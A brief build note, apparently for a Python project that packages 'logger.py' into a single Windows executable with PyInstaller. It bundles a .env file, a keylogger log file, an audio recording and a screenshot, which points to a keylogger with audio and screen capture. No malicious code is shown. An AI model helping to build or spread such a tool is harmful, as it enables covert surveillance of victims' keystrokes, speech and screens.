## activate environement
.\venv\Scripts\activate

## Install Dependencies
pip install -r requirements.txt


## make exe file
pyinstaller --onefile --add-data ".env;." --add-data "keylogger_logs.txt;." --add-data "audio.wav;." --add-data "screenshot.png;." logger.py





